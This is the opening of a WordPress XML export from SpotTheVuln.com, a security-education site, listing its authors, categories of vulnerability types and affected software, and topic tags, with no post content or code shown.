<?xml version="1.0" encoding="UTF-8" ?>
<!-- This is a WordPress eXtended RSS file generated by WordPress as an export of your site. -->
<!-- It contains information about your site's posts, pages, comments, categories, and other content. -->
<!-- You may use this file to transfer that content from one site to another. -->
<!-- This file is not intended to serve as a complete backup of your site. -->

<!-- To import this information into a WordPress site follow these steps: -->
<!-- 1. Log in to that site as an administrator. -->
<!-- 2. Go to Tools: Import in the WordPress admin panel. -->
<!-- 3. Install the "WordPress" importer from the list. -->
<!-- 4. Activate & Run Importer. -->
<!-- 5. Upload this file using the form provided on that page. -->
<!-- 6. You will first be asked to map the authors in this export file to users -->
<!--    on the site. For each author, you may choose to map to an -->
<!--    existing user on the site or to create a new user. -->
<!-- 7. WordPress will then import each of the posts, pages, comments, categories, etc. -->
<!--    contained in this file into your site. -->

<!-- generator="WordPress/3.3.1" created="2012-08-29 18:15" -->
<rss version="2.0"
	xmlns:excerpt="http://wordpress.org/export/1.1/excerpt/"
	xmlns:content="http://purl.org/rss/1.0/modules/content/"
	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
	xmlns:dc="http://purl.org/dc/elements/1.1/"
	xmlns:wp="http://wordpress.org/export/1.1/"
>

<channel>
	<title>SpotTheVuln.com</title>
	<link>http://spotthevuln.com</link>
	<description>Helping Developers Understand Security</description>
	<pubDate>Wed, 29 Aug 2012 18:15:01 +0000</pubDate>
	<language>en</language>
	<wp:wxr_version>1.1</wp:wxr_version>
	<wp:base_site_url>http://spotthevuln.com</wp:base_site_url>
	<wp:base_blog_url>http://spotthevuln.com</wp:base_blog_url>

	<wp:author><wp:author_id>1</wp:author_id><wp:author_login>BrettH</wp:author_login><wp:author_email>hardin.brett+spotthevuln@gmail.com</wp:author_email><wp:author_display_name><![CDATA[Brett Hardin]]></wp:author_display_name><wp:author_first_name><![CDATA[Brett]]></wp:author_first_name><wp:author_last_name><![CDATA[Hardin]]></wp:author_last_name></wp:author>
	<wp:author><wp:author_id>2</wp:author_id><wp:author_login>bkrios</wp:author_login><wp:author_email>billy.rios+wordpress@gmail.com</wp:author_email><wp:author_display_name><![CDATA[bkrios]]></wp:author_display_name><wp:author_first_name><![CDATA[Billy]]></wp:author_first_name><wp:author_last_name><![CDATA[Rios]]></wp:author_last_name></wp:author>
	<wp:author><wp:author_id>3</wp:author_id><wp:author_login>psthomas</wp:author_login><wp:author_email>psthomas@gmail.com</wp:author_email><wp:author_display_name><![CDATA[psthomas]]></wp:author_display_name><wp:author_first_name><![CDATA[Patrick]]></wp:author_first_name><wp:author_last_name><![CDATA[Thomas]]></wp:author_last_name></wp:author>

	<wp:category><wp:term_id>16</wp:term_id><wp:category_nicename>all-languages</wp:category_nicename><wp:category_parent></wp:category_parent><wp:cat_name><![CDATA[All Languages]]></wp:cat_name><wp:category_description><![CDATA[The following posts are all of the vulnerable pieces of source code SpotTheVuln has ever released. Each of these posts have a vulnerability such as Cross-Site Scripting (XSS) or SQL injection. Each piece of source code listed here has at least one vulnerability. Do you think you or your developers have what it takes to spot the vulnerability?]]></wp:category_description></wp:category>
	<wp:category><wp:term_id>12</wp:term_id><wp:category_nicename>all-software</wp:category_nicename><wp:category_parent></wp:category_parent><wp:cat_name><![CDATA[All Software]]></wp:cat_name><wp:category_description><![CDATA[<p>This is all of the software that SpotTheVuln has ever done an article on.</p>]]></wp:category_description></wp:category>
	<wp:category><wp:term_id>8</wp:term_id><wp:category_nicename>all-vulnerabilities</wp:category_nicename><wp:category_parent></wp:category_parent><wp:cat_name><![CDATA[All Vulnerabilities]]></wp:cat_name><wp:category_description><![CDATA[The following posts are all of the solutions to the source code released on SpotTheVuln.]]></wp:category_description></wp:category>
	<wp:category><wp:term_id>34</wp:term_id><wp:category_nicename>apache-software</wp:category_nicename><wp:category_parent>all-software</wp:category_parent><wp:cat_name><![CDATA[Apache]]></wp:cat_name><wp:category_description><![CDATA[The following posts are the solutions for vulnerabilities identified in Apache.]]></wp:category_description></wp:category>
	<wp:category><wp:term_id>30</wp:term_id><wp:category_nicename>appfuse</wp:category_nicename><wp:category_parent>all-software</wp:category_parent><wp:cat_name><![CDATA[AppFuse]]></wp:cat_name><wp:category_description><![CDATA[The following posts are the solutions for vulnerabilities identified in AppFuse.]]></wp:category_description></wp:category>
	<wp:category><wp:term_id>150</wp:term_id><wp:category_nicename>boinc</wp:category_nicename><wp:category_parent>all-software</wp:category_parent><wp:cat_name><![CDATA[Boinc]]></wp:cat_name></wp:category>
	<wp:category><wp:term_id>151</wp:term_id><wp:category_nicename>bonic</wp:category_nicename><wp:category_parent>all-software</wp:category_parent><wp:cat_name><![CDATA[Bonic]]></wp:cat_name></wp:category>
	<wp:category><wp:term_id>10</wp:term_id><wp:category_nicename>crlf-injection</wp:category_nicename><wp:category_parent>all-vulnerabilities</wp:category_parent><wp:cat_name><![CDATA[Carriage Return/Line Feed (CRLF) Injection]]></wp:cat_name></wp:category>
	<wp:category><wp:term_id>4</wp:term_id><wp:category_nicename>code-snippet</wp:category_nicename><wp:category_parent></wp:category_parent><wp:cat_name><![CDATA[Code Snippet]]></wp:cat_name><wp:category_description><![CDATA[These code snippets have a security vulnerability somewhere in the source code. Can you identify where the security vulnerability is? They are posted every Monday at 8:00am PST.]]></wp:category_description></wp:category>
	<wp:category><wp:term_id>201</wp:term_id><wp:category_nicename>cross-site-request-forgery-xsrf</wp:category_nicename><wp:category_parent>all-vulnerabilities</wp:category_parent><wp:cat_name><![CDATA[Cross Site Request Forgery (XSRF)]]></wp:cat_name></wp:category>
	<wp:category><wp:term_id>15</wp:term_id><wp:category_nicename>xss</wp:category_nicename><wp:category_parent>all-vulnerabilities</wp:category_parent><wp:cat_name><![CDATA[Cross-Site Scripting (XSS)]]></wp:cat_name><wp:category_description><![CDATA[These are snippets of open source code that have resolved an issue with Cross-Site Scripting (XSS). After viewing the solution, you can visit the original piece of code that was susceptible to Cross-Site Scripting (XSS) by clicking the Original Code Link.]]></wp:category_description></wp:category>
	<wp:category><wp:term_id>196</wp:term_id><wp:category_nicename>cubed</wp:category_nicename><wp:category_parent>all-software</wp:category_parent><wp:cat_name><![CDATA[Cubed]]></wp:cat_name></wp:category>
	<wp:category><wp:term_id>19</wp:term_id><wp:category_nicename>defense-in-depth</wp:category_nicename><wp:category_parent>all-vulnerabilities</wp:category_parent><wp:cat_name><![CDATA[Defense In Depth]]></wp:cat_name></wp:category>
	<wp:category><wp:term_id>68</wp:term_id><wp:category_nicename>dojo</wp:category_nicename><wp:category_parent>all-software</wp:category_parent><wp:cat_name><![CDATA[DoJo]]></wp:cat_name><wp:category_description><![CDATA[<p>The following posts are the solutions for vulnerabilities identified in AppFuse.</p>]]></wp:category_description></wp:category>
	<wp:category><wp:term_id>24</wp:term_id><wp:category_nicename>drupal</wp:category_nicename><wp:category_parent>all-software</wp:category_parent><wp:cat_name><![CDATA[Drupal]]></wp:cat_name></wp:category>
	<wp:category><wp:term_id>33</wp:term_id><wp:category_nicename>file-inclusion</wp:category_nicename><wp:category_parent>all-vulnerabilities</wp:category_parent><wp:cat_name><![CDATA[File Inclusion]]></wp:cat_name></wp:category>
	<wp:category><wp:term_id>188</wp:term_id><wp:category_nicename>freenas</wp:category_nicename><wp:category_parent>all-software</wp:category_parent><wp:cat_name><![CDATA[FreeNAS]]></wp:cat_name></wp:category>
	<wp:category><wp:term_id>160</wp:term_id><wp:category_nicename>freepbx</wp:category_nicename><wp:category_parent>all-software</wp:category_parent><wp:cat_name><![CDATA[FreePBX]]></wp:cat_name></wp:category>
	<wp:category><wp:term_id>11</wp:term_id><wp:category_nicename>http-header-injection</wp:category_nicename><wp:category_parent>all-vulnerabilities</wp:category_parent><wp:cat_name><![CDATA[HTTP header injection]]></wp:cat_name></wp:category>
	<wp:category><wp:term_id>6</wp:term_id><wp:category_nicename>information</wp:category_nicename><wp:category_parent></wp:category_parent><wp:cat_name><![CDATA[Information]]></wp:cat_name><wp:category_description><![CDATA[Generic information regarding Spot The Vuln.]]></wp:category_description></wp:category>
	<wp:category><wp:term_id>25</wp:term_id><wp:category_nicename>jackrabbit</wp:category_nicename><wp:category_parent>all-software</wp:category_parent><wp:cat_name><![CDATA[JackRabbit]]></wp:cat_name></wp:category>
	<wp:category><wp:term_id>14</wp:term_id><wp:category_nicename>java</wp:category_nicename><wp:category_parent>all-languages</wp:category_parent><wp:cat_name><![CDATA[Java]]></wp:cat_name><wp:category_description><![CDATA[The following posts are vulnerable pieces of Java source code. These pieces of vulnerable Java could have vulnerabilities such as Cross-Site Scripting or SQL injection. Each piece of Java code listed here has at least one vulnerability. Do you think you or your developers have what it takes to spot the vulnerability in Java?]]></wp:category_description></wp:category>
	<wp:category><wp:term_id>67</wp:term_id><wp:category_nicename>javascript</wp:category_nicename><wp:category_parent>all-languages</wp:category_parent><wp:cat_name><![CDATA[JavaScript]]></wp:cat_name><wp:category_description><![CDATA[The following posts are vulnerable pieces of JavaScript source code. These pieces of vulnerable JavaScript could have vulnerabilities such as Cross-Site Scripting or SQL injection. Each piece of  JavaScript listed here has at least one vulnerability. Do you think you or your developers have what it takes to spot the vulnerability in JavaScript Code?]]></wp:category_description></wp:category>
	<wp:category><wp:term_id>23</wp:term_id><wp:category_nicename>joomla</wp:category_nicename><wp:category_parent>all-software</wp:category_parent><wp:cat_name><![CDATA[Joomla]]></wp:cat_name></wp:category>
	<wp:category><wp:term_id>20</wp:term_id><wp:category_nicename>jspwiki</wp:category_nicename><wp:category_parent>all-software</wp:category_parent><wp:cat_name><![CDATA[JSPWiki]]></wp:cat_name></wp:category>
	<wp:category><wp:term_id>39</wp:term_id><wp:category_nicename>ldap-injection</wp:category_nicename><wp:category_parent>all-vulnerabilities</wp:category_parent><wp:cat_name><![CDATA[LDAP Injection]]></wp:cat_name></wp:category>
	<wp:category><wp:term_id>87</wp:term_id><wp:category_nicename>openfire</wp:category_nicename><wp:category_parent>all-software</wp:category_parent><wp:cat_name><![CDATA[Openfire]]></wp:cat_name></wp:category>
	<wp:category><wp:term_id>32</wp:term_id><wp:category_nicename>oscommerce</wp:category_nicename><wp:category_parent>all-software</wp:category_parent><wp:cat_name><![CDATA[OSCommerce]]></wp:cat_name></wp:category>
	<wp:category><wp:term_id>190</wp:term_id><wp:category_nicename>photosmash</wp:category_nicename><wp:category_parent>all-software</wp:category_parent><wp:cat_name><![CDATA[PhotoSmash]]></wp:cat_name></wp:category>
	<wp:category><wp:term_id>7</wp:term_id><wp:category_nicename>php</wp:category_nicename><wp:category_parent>all-languages</wp:category_parent><wp:cat_name><![CDATA[PHP]]></wp:cat_name><wp:category_description><![CDATA[The following posts are vulnerable pieces of PHP source code. These pieces of vulnerable PHP could have vulnerabilities such as Cross-Site Scripting or SQL injection. Each piece of PHP code listed here has at least one vulnerability. Do you think you or your developers have what it takes to spot the vulnerability in PHP?]]></wp:category_description></wp:category>
	<wp:category><wp:term_id>200</wp:term_id><wp:category_nicename>pixelpost</wp:category_nicename><wp:category_parent>all-software</wp:category_parent><wp:cat_name><![CDATA[PixelPost]]></wp:cat_name></wp:category>
	<wp:category><wp:term_id>18</wp:term_id><wp:category_nicename>privilege-escalation</wp:category_nicename><wp:category_parent>all-vulnerabilities</wp:category_parent><wp:cat_name><![CDATA[Privilege Escalation]]></wp:cat_name></wp:category>
	<wp:category><wp:term_id>126</wp:term_id><wp:category_nicename>punbb</wp:category_nicename><wp:category_parent>all-software</wp:category_parent><wp:cat_name><![CDATA[PunBB]]></wp:cat_name></wp:category>
	<wp:category><wp:term_id>38</wp:term_id><wp:category_nicename>shiro</wp:category_nicename><wp:category_parent>all-software</wp:category_parent><wp:cat_name><![CDATA[Shiro]]></wp:cat_name></wp:category>
	<wp:category><wp:term_id>3</wp:term_id><wp:category_nicename>solution</wp:category_nicename><wp:category_parent></wp:category_parent><wp:cat_name><![CDATA[Solution]]></wp:cat_name><wp:category_description><![CDATA[These are the solutions. They are posted on Friday.]]></wp:category_description></wp:category>
	<wp:category><wp:term_id>17</wp:term_id><wp:category_nicename>sql-injection</wp:category_nicename><wp:category_parent>all-vulnerabilities</wp:category_parent><wp:cat_name><![CDATA[SQL Injection]]></wp:cat_name><wp:category_description><![CDATA[These are snippets of open source code that have resolved an issue with SQL Injection. After viewing the solution, you can visit the original piece of code that was susceptible to SQL Injection by clicking the Original Code Link.]]></wp:category_description></wp:category>
	<wp:category><wp:term_id>185</wp:term_id><wp:category_nicename>surfids</wp:category_nicename><wp:category_parent>all-software</wp:category_parent><wp:cat_name><![CDATA[SurfIDS]]></wp:cat_name></wp:category>
	<wp:category><wp:term_id>1</wp:term_id><wp:category_nicename>uncategorized</wp:category_nicename><wp:category_parent></wp:category_parent><wp:cat_name><![CDATA[Uncategorized]]></wp:cat_name></wp:category>
	<wp:category><wp:term_id>9</wp:term_id><wp:category_nicename>url-redirection</wp:category_nicename><wp:category_parent>all-vulnerabilities</wp:category_parent><wp:cat_name><![CDATA[URL Redirection]]></wp:cat_name></wp:category>
	<wp:category><wp:term_id>13</wp:term_id><wp:category_nicename>wordpress</wp:category_nicename><wp:category_parent>all-software</wp:category_parent><wp:cat_name><![CDATA[Wordpress]]></wp:cat_name><wp:category_description><![CDATA[The following posts are the solutions for vulnerabilities identified in Wordpress.]]></wp:category_description></wp:category>
	<wp:category><wp:term_id>115</wp:term_id><wp:category_nicename>actionscript</wp:category_nicename><wp:category_parent>all-languages</wp:category_parent><wp:cat_name><![CDATA[ActionScript]]></wp:cat_name><wp:category_description><![CDATA[The following posts are vulnerable pieces of ActionScript source code. These pieces of vulnerable ActionScript could have vulnerabilities such as Cross-Site Scripting or SQL injection. Each piece of  ActionScript listed here has at least one vulnerability. Do you think you or your developers have what it takes to spot the vulnerability in ActionScript Code?]]></wp:category_description></wp:category>
	<wp:tag><wp:term_id>36</wp:term_id><wp:tag_slug>addslashes</wp:tag_slug><wp:tag_name><![CDATA[addslashes]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>8</wp:term_id><wp:tag_slug>all-vulnerabilities</wp:tag_slug><wp:tag_name><![CDATA[All Vulnerabilities]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>27</wp:term_id><wp:tag_slug>apache</wp:tag_slug><wp:tag_name><![CDATA[Apache]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>168</wp:term_id><wp:tag_slug>apache-status</wp:tag_slug><wp:tag_name><![CDATA[apache status]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>30</wp:term_id><wp:tag_slug>appfuse</wp:tag_slug><wp:tag_name><![CDATA[AppFuse]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>122</wp:term_id><wp:tag_slug>application-languages</wp:tag_slug><wp:tag_name><![CDATA[application languages]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>71</wp:term_id><wp:tag_slug>arbitrary-values</wp:tag_slug><wp:tag_name><![CDATA[arbitrary values]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>174</wp:term_id><wp:tag_slug>array</wp:tag_slug><wp:tag_name><![CDATA[array]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>76</wp:term_id><wp:tag_slug>attacker</wp:tag_slug><wp:tag_name><![CDATA[attacker]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>145</wp:term_id><wp:tag_slug>attribute</wp:tag_slug><wp:tag_name><![CDATA[attribute]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>158</wp:term_id><wp:tag_slug>automation</wp:tag_slug><wp:tag_name><![CDATA[automation]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>43</wp:term_id><wp:tag_slug>backup</wp:tag_slug><wp:tag_name><![CDATA[backup]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>111</wp:term_id><wp:tag_slug>bad-idea</wp:tag_slug><wp:tag_name><![CDATA[bad idea]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>55</wp:term_id><wp:tag_slug>bug-fixes</wp:tag_slug><wp:tag_name><![CDATA[bug fixes]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>59</wp:term_id><wp:tag_slug>bugs</wp:tag_slug><wp:tag_name><![CDATA[bugs]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>180</wp:term_id><wp:tag_slug>carriage-return</wp:tag_slug><wp:tag_name><![CDATA[carriage return]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>81</wp:term_id><wp:tag_slug>category-manager</wp:tag_slug><wp:tag_name><![CDATA[category manager]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>127</wp:term_id><wp:tag_slug>classic-symptom</wp:tag_slug><wp:tag_name><![CDATA[classic symptom]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>70</wp:term_id><wp:tag_slug>client-side-script</wp:tag_slug><wp:tag_name><![CDATA[client side script]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>162</wp:term_id><wp:tag_slug>code-execution</wp:tag_slug><wp:tag_name><![CDATA[code execution]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>140</wp:term_id><wp:tag_slug>code-samples</wp:tag_slug><wp:tag_name><![CDATA[code samples]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>4</wp:term_id><wp:tag_slug>code-snippet</wp:tag_slug><wp:tag_name><![CDATA[Code Snippet]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>88</wp:term_id><wp:tag_slug>collaboration-server</wp:tag_slug><wp:tag_name><![CDATA[collaboration server]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>44</wp:term_id><wp:tag_slug>consumption</wp:tag_slug><wp:tag_name><![CDATA[Consumption]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>78</wp:term_id><wp:tag_slug>cross-site-scripting</wp:tag_slug><wp:tag_name><![CDATA[cross site scripting]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>15</wp:term_id><wp:tag_slug>xss</wp:tag_slug><wp:tag_name><![CDATA[Cross-Site Scripting (XSS)]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>61</wp:term_id><wp:tag_slug>csrf</wp:tag_slug><wp:tag_name><![CDATA[CSRF]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>176</wp:term_id><wp:tag_slug>database-passwords</wp:tag_slug><wp:tag_name><![CDATA[database passwords]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>136</wp:term_id><wp:tag_slug>debugging</wp:tag_slug><wp:tag_name><![CDATA[debugging]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>147</wp:term_id><wp:tag_slug>default-case</wp:tag_slug><wp:tag_name><![CDATA[default case]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>19</wp:term_id><wp:tag_slug>defense-in-depth</wp:tag_slug><wp:tag_name><![CDATA[Defense In Depth]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>130</wp:term_id><wp:tag_slug>developers</wp:tag_slug><wp:tag_name><![CDATA[developers]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>155</wp:term_id><wp:tag_slug>disclosure</wp:tag_slug><wp:tag_name><![CDATA[disclosure]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>77</wp:term_id><wp:tag_slug>document-write</wp:tag_slug><wp:tag_name><![CDATA[document write]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>135</wp:term_id><wp:tag_slug>dojo-2</wp:tag_slug><wp:tag_name><![CDATA[Dojo]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>109</wp:term_id><wp:tag_slug>double-quotes</wp:tag_slug><wp:tag_name><![CDATA[double quotes]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>186</wp:term_id><wp:tag_slug>dynamic-query</wp:tag_slug><wp:tag_name><![CDATA[dynamic query]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>46</wp:term_id><wp:tag_slug>dynamic-sql</wp:tag_slug><wp:tag_name><![CDATA[dynamic SQL]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>183</wp:term_id><wp:tag_slug>dynamic-sql-statements</wp:tag_slug><wp:tag_name><![CDATA[dynamic sql statements]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>161</wp:term_id><wp:tag_slug>echo-system</wp:tag_slug><wp:tag_name><![CDATA[echo system]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>170</wp:term_id><wp:tag_slug>echoes</wp:tag_slug><wp:tag_name><![CDATA[echoes]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>28</wp:term_id><wp:tag_slug>encode</wp:tag_slug><wp:tag_name><![CDATA[Encode]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>139</wp:term_id><wp:tag_slug>error-message</wp:tag_slug><wp:tag_name><![CDATA[error message]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>197</wp:term_id><wp:tag_slug>false-sense-of-security</wp:tag_slug><wp:tag_name><![CDATA[false sense of security]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>33</wp:term_id><wp:tag_slug>file-inclusion</wp:tag_slug><wp:tag_name><![CDATA[File Inclusion]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>49</wp:term_id><wp:tag_slug>framework-level</wp:tag_slug><wp:tag_name><![CDATA[framework level]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>165</wp:term_id><wp:tag_slug>freepbx-2</wp:tag_slug><wp:tag_name><![CDATA[freepbx]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>41</wp:term_id><wp:tag_slug>globals</wp:tag_slug><wp:tag_name><![CDATA[globals]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>66</wp:term_id><wp:tag_slug>hash</wp:tag_slug><wp:tag_name><![CDATA[hash]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>177</wp:term_id><wp:tag_slug>hashing-algorithm</wp:tag_slug><wp:tag_name><![CDATA[hashing algorithm]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>63</wp:term_id><wp:tag_slug>hashing-function</wp:tag_slug><wp:tag_name><![CDATA[hashing function]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>148</wp:term_id><wp:tag_slug>html-encoding</wp:tag_slug><wp:tag_name><![CDATA[html encoding]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>48</wp:term_id><wp:tag_slug>html-markup</wp:tag_slug><wp:tag_name><![CDATA[html markup]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>144</wp:term_id><wp:tag_slug>html-tag</wp:tag_slug><wp:tag_name><![CDATA[html tag]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>154</wp:term_id><wp:tag_slug>htmlspecialchars</wp:tag_slug><wp:tag_name><![CDATA[htmlspecialchars]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>60</wp:term_id><wp:tag_slug>inclusion</wp:tag_slug><wp:tag_name><![CDATA[inclusion]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>37</wp:term_id><wp:tag_slug>information-disclosure</wp:tag_slug><wp:tag_name><![CDATA[information disclosure]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>173</wp:term_id><wp:tag_slug>injection-bug</wp:tag_slug><wp:tag_name><![CDATA[injection bug]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>143</wp:term_id><wp:tag_slug>input-field</wp:tag_slug><wp:tag_name><![CDATA[input field]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>172</wp:term_id><wp:tag_slug>input-results</wp:tag_slug><wp:tag_name><![CDATA[input results]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>97</wp:term_id><wp:tag_slug>input-value</wp:tag_slug><wp:tag_name><![CDATA[input value]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>108</wp:term_id><wp:tag_slug>insert-sql</wp:tag_slug><wp:tag_name><![CDATA[insert sql]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>121</wp:term_id><wp:tag_slug>internal-functionality</wp:tag_slug><wp:tag_name><![CDATA[internal functionality]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>25</wp:term_id><wp:tag_slug>jackrabbit</wp:tag_slug><wp:tag_name><![CDATA[JackRabbit]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>191</wp:term_id><wp:tag_slug>javascript-eval</wp:tag_slug><wp:tag_name><![CDATA[javascript eval]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>69</wp:term_id><wp:tag_slug>javascript-variables</wp:tag_slug><wp:tag_name><![CDATA[javascript variables]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>102</wp:term_id><wp:tag_slug>jive-software</wp:tag_slug><wp:tag_name><![CDATA[jive software]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>26</wp:term_id><wp:tag_slug>jsp</wp:tag_slug><wp:tag_name><![CDATA[JSP]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>112</wp:term_id><wp:tag_slug>jsp-code</wp:tag_slug><wp:tag_name><![CDATA[jsp code]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>58</wp:term_id><wp:tag_slug>logic</wp:tag_slug><wp:tag_name><![CDATA[logic]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>104</wp:term_id><wp:tag_slug>lt</wp:tag_slug><wp:tag_name><![CDATA[lt]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>128</wp:term_id><wp:tag_slug>markup</wp:tag_slug><wp:tag_name><![CDATA[markup]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>193</wp:term_id><wp:tag_slug>mobile</wp:tag_slug><wp:tag_name><![CDATA[mobile]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>194</wp:term_id><wp:tag_slug>mobile-clients</wp:tag_slug><wp:tag_name><![CDATA[mobile clients]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>54</wp:term_id><wp:tag_slug>nonce</wp:tag_slug><wp:tag_name><![CDATA[nonce]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>101</wp:term_id><wp:tag_slug>null-return</wp:tag_slug><wp:tag_name><![CDATA[null return]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>105</wp:term_id><wp:tag_slug>numeric-characters</wp:tag_slug><wp:tag_name><![CDATA[numeric characters]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>152</wp:term_id><wp:tag_slug>open-source-project</wp:tag_slug><wp:tag_name><![CDATA[open source project]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>87</wp:term_id><wp:tag_slug>openfire</wp:tag_slug><wp:tag_name><![CDATA[Openfire]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>74</wp:term_id><wp:tag_slug>parameter-values</wp:tag_slug><wp:tag_name><![CDATA[parameter values]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>199</wp:term_id><wp:tag_slug>parameterized-queries</wp:tag_slug><wp:tag_name><![CDATA[parameterized queries]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>166</wp:term_id><wp:tag_slug>parameters</wp:tag_slug><wp:tag_name><![CDATA[parameters]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>65</wp:term_id><wp:tag_slug>password-protection</wp:tag_slug><wp:tag_name><![CDATA[password protection]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>163</wp:term_id><wp:tag_slug>pbx-system</wp:tag_slug><wp:tag_name><![CDATA[pbx system]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>21</wp:term_id><wp:tag_slug>persistent</wp:tag_slug><wp:tag_name><![CDATA[Persistent]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>195</wp:term_id><wp:tag_slug>phone-browser</wp:tag_slug><wp:tag_name><![CDATA[phone browser]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>7</wp:term_id><wp:tag_slug>php</wp:tag_slug><wp:tag_name><![CDATA[PHP]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>164</wp:term_id><wp:tag_slug>php-code</wp:tag_slug><wp:tag_name><![CDATA[php code]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>86</wp:term_id><wp:tag_slug>php-documentation</wp:tag_slug><wp:tag_name><![CDATA[php documentation]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>134</wp:term_id><wp:tag_slug>php-echo</wp:tag_slug><wp:tag_name><![CDATA[php echo]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>40</wp:term_id><wp:tag_slug>plugin</wp:tag_slug><wp:tag_name><![CDATA[plugin]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>80</wp:term_id><wp:tag_slug>plugin-developers</wp:tag_slug><wp:tag_name><![CDATA[plugin developers]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>45</wp:term_id><wp:tag_slug>plugins</wp:tag_slug><wp:tag_name><![CDATA[plugins]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>129</wp:term_id><wp:tag_slug>post</wp:tag_slug><wp:tag_name><![CDATA[POST]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>133</wp:term_id><wp:tag_slug>prepared-statement</wp:tag_slug><wp:tag_name><![CDATA[prepared statement]]></wp:tag_name></wp:tag>
	<wp:tag><wp:term_id>141</wp:term_id><wp:tag_slug>production-environment</wp:tag_slug><wp:tag_name><![CDATA[production environment]]></wp:tag_name></wp:tag>
